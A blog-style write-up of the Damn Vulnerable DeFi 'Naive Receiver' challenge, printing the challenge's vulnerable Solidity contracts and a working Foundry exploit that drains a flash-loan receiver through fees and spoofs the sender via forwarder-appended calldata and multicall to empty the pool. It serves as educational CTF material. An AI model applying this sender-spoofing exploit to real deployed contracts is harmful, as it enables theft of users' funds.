+++
date = '2024-10-27T18:23:27+05:30'
layout="post"
draft = false
title = 'NaiveReceiver'
categories=["Blockchain"]
series="Damn-Vulnerable-Defi"
tags=["Delegate Call","Access Control"]
+++

# WriteUp for NaiveReceiver

Hello h4ck3r, welcome to the world of DeFi security! Working through challenges on Damn Vulnerable DeFi will sharpen your skills in identifying and exploiting vulnerabilities within decentralized finance protocols. Each challenge represents a specific DeFi exploit scenario, allowing you to test strategies for attacking smart contracts and understand the underlying mechanics of DeFi. If you're new to Solidity and DeFi principles, You might need to solve Ethernaut first to get an overview of common exploits and vulnerabilities in smart contracts, which will be essential for tackling these challenges.

### Key Concepts to Learn

In Solidity, low-level calls don't strictly validate the calldata, which can lead to unintended behavior. For instance, if a function does not take any input parameters, you can still construct calldata that includes the function selector followed by extra data. When this function is called, it will execute successfully, and msg.data will contain the full calldata, including the extra appended data along with the function selector. This behavior can be leveraged in specific exploit scenarios, where functions process msg.data directly, potentially leading to unexpected results or vulnerabilities.

Check the below example.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Test{
    bytes public data;
    function hello()public{
        data=msg.data;
    }
}


contract Test1{
    Test test;
    constructor(address _addr){
        test=Test(_addr);
    }
    function call_hello()public{
        bytes8 call_data=bytes8(keccak256(abi.encodePacked("hello()")));
        bytes memory call_data1=abi.encodePacked(call_data);
        (bool success,)=address(test).call(call_data1);
        require(success,"Call Failed");
    }
}
```

I suggest you to try out this example in [remix](https://remix.ethereum.org/) before going through the further solution.

First, deploy the `Test` contract. Then, pass the address of the deployed `Test` contract as an argument to the constructor of the `Test1` contract and deploy the `Test1` contract.

Then call the `call_hello()` function in the `Test1` contract. Once the call is successful, check the value of `data` in the `Test` contract. Now directly call the `hello()` function in the `Test` contract and once the call is successful, check the value of `data`.

You can observe that the first time you check, the value of `data` is `0x19ff1d210e06a53e`, and the second time you check, the value is `0x19ff1d21`.

The difference is that the second time we are directly calling the `hello()` function from our EOA using Remix, whereas the first time we are calling `hello()` from another contract, and in that contract, we are constructing calldata to call the `hello()` function along with some other data.

From this, we can conclude that when we send some data to a function more than the parameters it is expecting, the call won't be reverted.

This understanding is crucial to solve this challenge. Once you understand this, I would suggest you go through the challenge once again and try to solve it before going to the Exploit part.

If you are a person who doesn't know [EIP712](https://eips.ethereum.org/EIPS/eip-712) or [EIP3156](https://eips.ethereum.org/EIPS/eip-3156), I would suggest you go through the EIPs and then try to solve the challenge.

### Exploit

The below are the source contracts.

1. **BasicForwader** contract

```solidity
// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {EIP712} from "solady/utils/EIP712.sol";
import {ECDSA} from "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";
import {Address} from "@openzeppelin/contracts/utils/Address.sol";

interface IHasTrustedForwarder {
    function trustedForwarder() external view returns (address);
}

contract BasicForwarder is EIP712 {
    struct Request {
        address from;
        address target;
        uint256 value;
        uint256 gas;
        uint256 nonce;
        bytes data;
        uint256 deadline;
    }

    error InvalidSigner();
    error InvalidNonce();
    error OldRequest();
    error InvalidTarget();
    error InvalidValue();

    bytes32 private constant _REQUEST_TYPEHASH = keccak256(
        "Request(address from,address target,uint256 value,uint256 gas,uint256 nonce,bytes data,uint256 deadline)"
    );

    mapping(address => uint256) public nonces;

    /**
     * @notice Check request and revert when not valid. A valid request must:
     * - Include the expected value
     * - Not be expired
     * - Include the expected nonce
     * - Target a contract that accepts this forwarder
     * - Be signed by the original sender (`from` field)
     */
    function _checkRequest(Request calldata request, bytes calldata signature) private view {
        if (request.value != msg.value) revert InvalidValue();
        if (block.timestamp > request.deadline) revert OldRequest();
        if (nonces[request.from] != request.nonce) revert InvalidNonce();

        if (IHasTrustedForwarder(request.target).trustedForwarder() != address(this)) revert InvalidTarget();

        address signer = ECDSA.recover(_hashTypedData(getDataHash(request)), signature);
        if (signer != request.from) revert InvalidSigner();
    }

    function execute(Request calldata request, bytes calldata signature) public payable returns (bool success) {
        _checkRequest(request, signature);

        nonces[request.from]++;

        uint256 gasLeft;
        uint256 value = request.value; // in wei
        address target = request.target;
        bytes memory payload = abi.encodePacked(request.data, request.from);
        uint256 forwardGas = request.gas;
        assembly {
            success := call(forwardGas, target, value, add(payload, 0x20), mload(payload), 0, 0) // don't copy returndata
            gasLeft := gas()
        }

        if (gasLeft < request.gas / 63) {
            assembly {
                invalid()
            }
        }
    }

    function _domainNameAndVersion() internal pure override returns (string memory name, string memory version) {
        name = "BasicForwarder";
        version = "1";
    }

    function getDataHash(Request memory request) public pure returns (bytes32) {
        return keccak256(
            abi.encode(
                _REQUEST_TYPEHASH,
                request.from,
                request.target,
                request.value,
                request.gas,
                request.nonce,
                keccak256(request.data),
                request.deadline
            )
        );
    }

    function domainSeparator() external view returns (bytes32) {
        return _domainSeparator();
    }

    function getRequestTypehash() external pure returns (bytes32) {
        return _REQUEST_TYPEHASH;
    }
}
```

2. **FlashLoanReceiver** contract

```solidity
// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import {WETH, NaiveReceiverPool} from "./NaiveReceiverPool.sol";

contract FlashLoanReceiver is IERC3156FlashBorrower {
    address private pool;

    constructor(address _pool) {
        pool = _pool;
    }

    function onFlashLoan(address, address token, uint256 amount, uint256 fee, bytes calldata)
        external
        returns (bytes32)
    {
        assembly {
            // gas savings
            if iszero(eq(sload(pool.slot), caller())) {
                mstore(0x00, 0x48f5c3ed)
                revert(0x1c, 0x04)
            }
        }

        if (token != address(NaiveReceiverPool(pool).weth())) revert NaiveReceiverPool.UnsupportedCurrency();

        uint256 amountToBeRepaid;
        unchecked {
            amountToBeRepaid = amount + fee;
        }

        _executeActionDuringFlashLoan();

        // Return funds to pool
        WETH(payable(token)).approve(pool, amountToBeRepaid);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    // Internal function where the funds received would be used
    function _executeActionDuringFlashLoan() internal {}
}
```

3. **Multicall** contract

```solidity
// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Address} from "@openzeppelin/contracts/utils/Address.sol";
import {Context} from "@openzeppelin/contracts/utils/Context.sol";

abstract contract Multicall is Context {
    function multicall(bytes[] calldata data) external virtual returns (bytes[] memory results) {
        results = new bytes[](data.length);
        for (uint256 i = 0; i < data.length; i++) {
            results[i] = Address.functionDelegateCall(address(this), data[i]);
        }
        return results;
    }
}
```

4. **NavieReceiverPool** contract

```solidity
// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {IERC3156FlashLender} from "@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import {FlashLoanReceiver} from "./FlashLoanReceiver.sol";
import {Multicall} from "./Multicall.sol";
import {WETH} from "solmate/tokens/WETH.sol";

contract NaiveReceiverPool is Multicall, IERC3156FlashLender {
    uint256 private constant FIXED_FEE = 1e18; // not the cheapest flash loan
    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");

    WETH public immutable weth;
    address public immutable trustedForwarder;
    address public immutable feeReceiver;

    mapping(address => uint256) public deposits;
    uint256 public totalDeposits;

    error RepayFailed();
    error UnsupportedCurrency();
    error CallbackFailed();

    constructor(address _trustedForwarder, address payable _weth, address _feeReceiver) payable {
        weth = WETH(_weth);
        trustedForwarder = _trustedForwarder;
        feeReceiver = _feeReceiver;
        _deposit(msg.value);
    }

    function maxFlashLoan(address token) external view returns (uint256) {
        if (token == address(weth)) return weth.balanceOf(address(this));
        return 0;
    }

    function flashFee(address token, uint256) external view returns (uint256) {
        if (token != address(weth)) revert UnsupportedCurrency();
        return FIXED_FEE;
    }

    function flashLoan(IERC3156FlashBorrower receiver, address token, uint256 amount, bytes calldata data)
        external
        returns (bool)
    {
        if (token != address(weth)) revert UnsupportedCurrency();

        // Transfer WETH and handle control to receiver
        weth.transfer(address(receiver), amount);
        totalDeposits -= amount;

        if (receiver.onFlashLoan(msg.sender, address(weth), amount, FIXED_FEE, data) != CALLBACK_SUCCESS) {
            revert CallbackFailed();
        }

        uint256 amountWithFee = amount + FIXED_FEE;
        weth.transferFrom(address(receiver), address(this), amountWithFee);
        totalDeposits += amountWithFee;

        deposits[feeReceiver] += FIXED_FEE;

        return true;
    }

    function withdraw(uint256 amount, address payable receiver) external {
        // Reduce deposits
        deposits[_msgSender()] -= amount;
        totalDeposits -= amount;

        // Transfer ETH to designated receiver
        weth.transfer(receiver, amount);
    }

    function deposit() external payable {
        _deposit(msg.value);
    }

    function _deposit(uint256 amount) private {
        weth.deposit{value: amount}();

        deposits[_msgSender()] += amount;
        totalDeposits += amount;
    }

    function _msgSender() internal view override returns (address) {
        if (msg.sender == trustedForwarder && msg.data.length >= 20) {
            return address(bytes20(msg.data[msg.data.length - 20:]));
        } else {
            return super._msgSender();
        }
    }
}
```

The below is the test contract where we write our exploit logic. 5. **NavieReceiver** contract

```solidity
// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {NaiveReceiverPool, Multicall, WETH} from "../../src/naive-receiver/NaiveReceiverPool.sol";
import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";

contract NaiveReceiverChallenge is Test {
    address deployer = makeAddr("deployer");
    address recovery = makeAddr("recovery");
    address player;
    uint256 playerPk;

    uint256 constant WETH_IN_POOL = 1000e18;
    uint256 constant WETH_IN_RECEIVER = 10e18;

    NaiveReceiverPool pool;
    WETH weth;
    FlashLoanReceiver receiver;
    BasicForwarder forwarder;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        (player, playerPk) = makeAddrAndKey("player");
        startHoax(deployer);

        // Deploy WETH
        weth = new WETH();

        // Deploy forwarder
        forwarder = new BasicForwarder();

        // Deploy pool and fund with ETH
        pool = new NaiveReceiverPool{value: WETH_IN_POOL}(address(forwarder), payable(weth), deployer);

        // Deploy flashloan receiver contract and fund it with some initial WETH
        receiver = new FlashLoanReceiver(address(pool));
        weth.deposit{value: WETH_IN_RECEIVER}();
        weth.transfer(address(receiver), WETH_IN_RECEIVER);

        vm.stopPrank();
    }

    function test_assertInitialState() public {
        // Check initial balances
        assertEq(weth.balanceOf(address(pool)), WETH_IN_POOL);
        assertEq(weth.balanceOf(address(receiver)), WETH_IN_RECEIVER);

        // Check pool config
        assertEq(pool.maxFlashLoan(address(weth)), WETH_IN_POOL);
        assertEq(pool.flashFee(address(weth), 0), 1 ether);
        assertEq(pool.feeReceiver(), deployer);

        // Cannot call receiver
        vm.expectRevert(0x48f5c3ed);
        receiver.onFlashLoan(
            deployer,
            address(weth), // token
            WETH_IN_RECEIVER, // amount
            1 ether, // fee
            bytes("") // data
        );
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_naiveReceiver() public checkSolvedByPlayer {
        ///////////////////////////////////
        // Empty Receiver Balance//////////
        ///////////////////////////////////

        for (uint8 i = 0; i < 10; i++) {
            pool.flashLoan(receiver, address(weth), WETH_IN_POOL, bytes(""));
        }

        ///////////////////////////////////
        // Withdraw All Funds To Recovery//
        ///////////////////////////////////

        uint256 total = WETH_IN_POOL + WETH_IN_RECEIVER;
        bytes memory Withdrawdata = abi.encodeWithSignature("withdraw(uint256,address)", total, recovery, deployer);
        bytes[] memory multicall_data_array = new bytes[](1);
        multicall_data_array[0] = Withdrawdata;
        bytes memory multicallEncodedData = abi.encodeWithSignature("multicall(bytes[])", multicall_data_array);
        BasicForwarder.Request memory executeRequest = BasicForwarder.Request({
            from: player,
            target: address(pool),
            value: 0,
            gas: 100000,
            nonce: vm.getNonce(player),
            data: multicallEncodedData,
            deadline: block.timestamp + 1000
        });

        bytes32 digest =
            keccak256(abi.encodePacked("\x19\x01", forwarder.domainSeparator(), forwarder.getDataHash(executeRequest)));

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, digest);

        forwarder.execute(executeRequest, abi.encodePacked(r, s, v));
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed two or less transactions
        assertLe(vm.getNonce(player), 2);

        // The flashloan receiver contract has been emptied
        assertEq(weth.balanceOf(address(receiver)), 0, "Unexpected balance in receiver contract");

        // Pool is empty too
        assertEq(weth.balanceOf(address(pool)), 0, "Unexpected balance in pool");

        // All funds sent to recovery account
        assertEq(weth.balanceOf(recovery), WETH_IN_POOL + WETH_IN_RECEIVER, "Not enough WETH in recovery account");
    }
}

```

In this challenge our task is to make `_isSolved()` function return true.

```solidity
function _isSolved() private view {
    // Player must have executed two or less transactions
    assertLe(vm.getNonce(player), 2);

    // The flashloan receiver contract has been emptied
    assertEq(weth.balanceOf(address(receiver)), 0, "Unexpected balance in receiver contract");

    // Pool is empty too
    assertEq(weth.balanceOf(address(pool)), 0, "Unexpected balance in pool");

    // All funds sent to recovery account
    assertEq(weth.balanceOf(recovery), WETH_IN_POOL + WETH_IN_RECEIVER, "Not enough WETH in recovery account");
}
```

The `_isSolved()` will be passed if we make the balance of WETH tokens in the receiver and pool zero and transfer all those tokens to the recovery address. You can look into setUp() function in test contract to understand how everything is deployed.

Now, without any delay, let's dive into the key functions which has the exploit.

```solidity
function flashLoan(IERC3156FlashBorrower receiver, address token, uint256 amount, bytes calldata data)
        external
        returns (bool)
    {
    if (token != address(weth)) revert UnsupportedCurrency();

    // Transfer WETH and handle control to receiver
    weth.transfer(address(receiver), amount);
    totalDeposits -= amount;

    if (receiver.onFlashLoan(msg.sender, address(weth), amount, FIXED_FEE, data) != CALLBACK_SUCCESS) {
        revert CallbackFailed();
    }

    uint256 amountWithFee = amount + FIXED_FEE;
    weth.transferFrom(address(receiver), address(this), amountWithFee);
    totalDeposits += amountWithFee;

    deposits[feeReceiver] += FIXED_FEE;

    return true;
}

```

This function is from the `NaiveReceiverPool` contract. When someone calls the `flashLoan()` function, it will send the WETH tokens to the receiver passed and then call the `onFlashLoan` function. The receiver must pay back the WETH tokens within the same transaction along with the fee. If they fail to pay, the transaction will revert. While calling the `onFlashLoan` function, it will pass the address of `msg.sender` (loan initiator) as the first argument.

Since the `flashLoan()` is calling `onFlashLoan()` on the receiver, the receiver must be a contract.

```solidity
function onFlashLoan(address, address token, uint256 amount, uint256 fee, bytes calldata)
        external
        returns (bytes32)
    {
    assembly {
        // gas savings
        if iszero(eq(sload(pool.slot), caller())) {
            mstore(0x00, 0x48f5c3ed)
            revert(0x1c, 0x04)
        }
    }

    if (token != address(NaiveReceiverPool(pool).weth())) revert NaiveReceiverPool.UnsupportedCurrency();

    uint256 amountToBeRepaid;
    unchecked {
        amountToBeRepaid = amount + fee;
    }

    _executeActionDuringFlashLoan();

    // Return funds to pool
    WETH(payable(token)).approve(pool, amountToBeRepaid);

    return keccak256("ERC3156FlashBorrower.onFlashLoan");
}
```

This function is from the `NaiveReceiver` contract. It will check if the pool has been set or not. If it is not set, it will revert; otherwise, it will continue executing. Then it will check whether the loan given is a WETH token or not. If it is not, it will revert; otherwise, it will continue execution. Then it will add the loan taken and the fee. Then it will call `_executeActionDuringFlashLoan()`. Once the call is completed, it will approve the pool contract to transfer WETH tokens and return the success message.

It is making all necessary checks, but it is not checking who actually executed the loan. So if we call the `flashLoan()` function in `NaiveReceiverPool` from our contract by passing the receiver as the receiver contract address, then it will initiate a loan to the receiver contract, and the receiver contract will use the loan amount and repay the loan amount along with the fee within the transaction.

Since the fee is 1 WETH token for every loan, it will transfer 1 WETH token. So if we initiate a loan to the receiver contract 10 times, then the receiver contract balance will be zero.

Our next goal is to make the pool balance as zero and transfer WETH from pool to recovery address.

```solidity
function _msgSender() internal view override returns (address) {
    if (msg.sender == trustedForwarder && msg.data.length >= 20) {
        return address(bytes20(msg.data[msg.data.length - 20:]));
    } else {
        return super._msgSender();
    }
}
```

The above function is from the `NaiveReceiver` contract. When it is called, it will check if the `msg.sender` (caller) is the `BasicForwarder` contract or not. If it is the `BasicForwarder` contract, it will return the last 20 bytes of calldata sent by the `BasicForwarder` contract. If the `msg.sender` is another address, then it will just return the address of the caller.

```solidity
function execute(Request calldata request, bytes calldata signature) public payable returns (bool success) {
    _checkRequest(request, signature);

    nonces[request.from]++;

    uint256 gasLeft;
    uint256 value = request.value; // in wei
    address target = request.target;
    bytes memory payload = abi.encodePacked(request.data, request.from);
    uint256 forwardGas = request.gas;
    assembly {
        success := call(forwardGas, target, value, add(payload, 0x20), mload(payload), 0, 0) // don't copy returndata
        gasLeft := gas()
    }

    if (gasLeft < request.gas / 63) {
        assembly {
            invalid()
        }
    }
}
```

The above function is from the `BasicForwarder` contract. It will check whether the signature passed to the function is signed by the `from` member of the struct. Once the `_checkRequest()` is passed, it will encode the `data` member and `from` member from the `Request` struct and assign it to `payload`. Then it will make a call to the `target` member of the `Request` struct passed. `payload` is calldata that is sent to the target. The last 20 bytes of `payload` will be the address of the `from` member of the `Request` struct.

Using the `execute` function, if we call any function in the `NaiveReceiverPool` contract other than `multicall()`, then `_msgSender()` in `NaiveReceiverPool` will return the address of the `from` member of the `Request` struct.

```solidity
function multicall(bytes[] calldata data) external virtual returns (bytes[] memory results) {
    results = new bytes[](data.length);
    for (uint256 i = 0; i < data.length; i++) {
        results[i] = Address.functionDelegateCall(address(this), data[i]);
    }
    return results;
}
```

But using the `execute` function, if we call the `multicall()` function in `NaiveReceiverPool`, then `execute` will add the `from` member of the `Request` struct to the `data` member of the `Request` struct and pass it to `multicall()`. Since our data only contains calldata to call `multicall()`, the `multicall()` function won't care about the next 20 bytes appended by the `execute()` function to our actual data.

The `multicall()` function will take a bytes array as input and make a delegate call to `NaiveReceiverPool` by passing each element of the bytes array as data. Since we are calling `multicall()` using the `execute()` function in `BasicForwarder`, whatever data we need to pass to the `multicall()` function, we need to construct it before and send the data as the `data` member of the `Request` struct.

```solidity
function withdraw(uint256 amount, address payable receiver) external {
    // Reduce deposits
    deposits[_msgSender()] -= amount;
    totalDeposits -= amount;

    // Transfer ETH to designated receiver
    weth.transfer(receiver, amount);
}

```

So if we pass a bytes array containing calldata to the `withdraw()` function as an argument to `multicall()`, then it will check the necessary conditions and transfer WETH to the receiver from the address returned by `_msgSender()`.

When we call `multicall()`, it will make a delegate call. During a delegate call, the `msg.sender` and `msg.value` will be passed to the next call as the `msg.sender` who called the `multicall()` function and the `msg.value` sent during the `multicall()` function. However, `msg.data` will not be the same for both calls. For `multicall()`, the `msg.data` will be the data sent by `execute()`, and for `withdraw()`, the `msg.data` will be the data sent by the `multicall()` function.

So while constructing data for the `withdraw()` function, if we add an extra 20 bytes as the address of the deployer, then the `withdraw()` function will be called and it will call `_msgSender()`. `_msgSender()` will return the address of the deployer, and since the deployer is holding the entire WETH, the `NaiveReceiverPool` will transfer the WETH to whatever address we pass. Since our task is to transfer all WETH from `NaiveReceiverPool` to the recovery address, we need to pass the recovery address in the `withdraw()` function.

The below is the Exploit logic.

```solidity
function test_naiveReceiver() public checkSolvedByPlayer {
    ///////////////////////////////////
    // Empty Receiver Balance//////////
    ///////////////////////////////////

    for (uint8 i = 0; i < 10; i++) {
        pool.flashLoan(receiver, address(weth), WETH_IN_POOL, bytes(""));
    }

    ///////////////////////////////////
    // Withdraw All Funds To Recovery//
    ///////////////////////////////////

    uint256 total = WETH_IN_POOL + WETH_IN_RECEIVER;
    bytes memory Withdrawdata = abi.encodeWithSignature("withdraw(uint256,address)", total, recovery, deployer);
    bytes[] memory multicall_data_array = new bytes[](1);
    multicall_data_array[0] = Withdrawdata;
    bytes memory multicallEncodedData = abi.encodeWithSignature("multicall(bytes[])", multicall_data_array);
    BasicForwarder.Request memory executeRequest = BasicForwarder.Request({
        from: player,
        target: address(pool),
        value: 0,
        gas: 100000,
        nonce: vm.getNonce(player),
        data: multicallEncodedData,
        deadline: block.timestamp + 1000
    });

    bytes32 digest =
        keccak256(abi.encodePacked("\x19\x01", forwarder.domainSeparator(), forwarder.getDataHash(executeRequest)));

    (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, digest);

    forwarder.execute(executeRequest, abi.encodePacked(r, s, v));
}
```

That's it for this challenge. Hope you enjoyed it. If you have any queries, leave a comment below.
